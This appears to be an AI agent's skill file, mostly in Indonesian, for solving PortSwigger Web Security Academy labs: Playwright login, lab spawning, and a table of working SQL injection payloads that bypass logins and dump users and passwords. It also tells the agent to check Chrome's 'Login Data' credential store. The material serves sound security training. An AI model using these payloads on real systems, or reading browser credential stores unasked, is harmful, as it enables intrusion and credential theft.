---
name: portswigger-labs
description: "Use when solving PortSwigger Web Security Academy labs."
version: 1.0.0
author: RESEARCHER_NAME
license: MIT
metadata:
  hermes:
    tags: [portswigger, labs, sqli, xss, exploit-practice, bug-bounty-training]
---

# PortSwigger Web Security Academy — Lab Solver Workflow

Latihan exploit end-to-end di PortSwigger labs (272 lab, 28 topik) sebagai
persiapan audit / bug bounty target real. Proses SOLVED yang sudah terbukti
(11 lab berurutan, sql-injection full series).

## Setup account (sekali, tersimpan)

- Login URL: `https://portswigger.net/users/login` (redirect ke Auth0
  `login.portswigger.net/u/login`).
- Credential tidak pernah tersimpan web di Chrome (hanya `android://` sync) —
  user harus kasih password sekali; **jangan looping tanya**, kalau user bilang
  "kamu cari/login aja" maka cek Chrome Login Data dulu, kalau tidak ada minta
  sekali dengan jelas.
- Cookie hasil login: `/tmp/ps_cookies.json`
  (39 cookies). Setup meta: `D:/data hermes/portswigger-setup.json`.
- Progress: `D:/data hermes/portswigger-progress.json`.

## Login — pakai Playwright sync API LANGSUNG (bukan browser-use daemon)

`browser-use` daemon sering mati (`CDP WS handshake failed`, `UnicodeDecodeError`
pada stdin). Jalur stabil:

```python
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
    ctx = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120")
    page = ctx.new_page()
    page.goto("https://portswigger.net/users/login", wait_until="domcontentloaded", timeout=30000)
    time.sleep(2)
    page.fill('#username', USER); page.fill('#password', PASS)
    page.click('button[type="submit"][name="action"]')
    time.sleep(8)
    # tunggu redirect keluar dari login.portswigger.net
    for _ in range(15):
        if "portswigger.net" in page.url and "login" not in page.url: break
        time.sleep(2)
    ctx.cookies() -> simpan JSON
```

Syarat sukses: title halaman = "My Account - PortSwigger".

## Spawn lab (dari daftar all-labs)

1. Ambil href lab dari `https://portswigger.net/web-security/all-labs` — **jangan
   menebak path**. Banyak lab ada di subfolder: `sql-injection/examining-the-database/lab-...`,
   `sql-injection/union-attacks/lab-...`. Fetch all-labs → parse `<a href>` yang
   mengandung `/lab-`.
2. Tombol launch href: `/academy/labs/launch/<hash>` — tapi cara paling ampuh:
   `expect_popup` lalu `click('a:has-text("ACCESS THE LAB")')`, `time.sleep(15)`
   utk provisioning.
3. Helper siap pakai: `scripts/ps_helper.py` (`spawn`, `solved`, `req`).

## Exploit — pakai `requests` langsung ke instance

Setelah instance didapat (`https://<rand>.web-security-academy.net/`), exploit
via `requests.Session()` + header UA. Lebih cepat & stabil daripada browser.
Session cookie PortSwigger TIDAK perlu dikirim ke instance lab (instance terpisah).

## Pola penyelesaian SQLi (dari 11 lab solved)

| Lab | Teknik |
|-----|--------|
| WHERE hidden data | `?category=Gifts' OR 1=1--` |
| Login bypass | username `administrator'--` |
| DB version Oracle | `UNION SELECT banner,NULL FROM v$version--` (wajib FROM dual) |
| DB version MySQL/MS | `UNION SELECT @@version,NULL-- ` (comment butuh spasi) |
| List tables (non-Oracle) | `UNION SELECT table_name,NULL FROM information_schema.tables-- ` → cari `users_*` |
| List columns | `UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='<tbl>'-- ` |
| Dump users | `UNION SELECT username_<x>,password_<y> FROM users_<z>-- ` |
| Oracle list tables/cols | `all_tables`, `all_tab_columns` (nama UPPERCASE) |
| Determining columns | iterasi `UNION SELECT NULL[,NULL...]-- ` sampai 200 |
| Find text column | iterasi taruh `'<target>'` di tiap posisi sampai string muncul |
| Multi-values single column | `username||'~'||password` (kolom string-capable) |
| Blind boolean | cookie TrackingId + oracle "Welcome back" (lihat references) |

Deteksi jumlah kolom / sukses per-lab beda: beberapa pakai `widgetcontainer`,
beberapa `View details`, beberapa `product`. Ambil marker dari response normal
dulu sebelum iterasi.

## Pitfall penting

1. **Instance belum siap**: root 200 + kategori links tapi `/filter?category=` 404
   atau "Not Found" → instance masih provisioning. Tunggu 10-15s atau spawn ulang.
2. **Double-slash URL** (`//login`) → "Not Found". Selalu `lab_url.rstrip("/") + "/path"`.
3. **Hint vs hasil**: string target bisa muncul di teks hint lab
   ("Make the database retrieve...") BUKAN dari query. Verifikasi string muncul
   di `<th>` sel tabel produk, bukan cek `in html` saja.
4. **Solved banner**: `"congratulations" in html.lower()` — cek di response
   terakhir (kadang butuh refresh/request ulang).
5. **Blind SQLi lambat** (~1.5s/probe): enumerasi password 20 char × 36 alphabet =
   bisa 15+ mnt → jalankan sebagai **background process** dengan checkpoint file
   per karakter, resume dari offset. Lihat `references/blind-sqli-enumeration.md`.
6. **Jangan blocking cell untuk enumerasi panjang** — timeout kernel 300s akan
   membunuh. Tulis script, jalankan `terminal(background=true)`.

## Progress & output

- Tracker: `D:/data hermes/portswigger-progress.json` (`labs[]` + `current`).
- Update SETELAH tiap lab solved (id, topic, name, payload, admin creds).
- Bukti: screenshot + payload + SOLVED banner.

## Files

- `scripts/ps_helper.py` — spawn/solved/req helper (load cookies, spawn lab, cek solved).
- `references/blind-sqli-enumeration.md` — boolean-based blind SQLi enumeration recipe.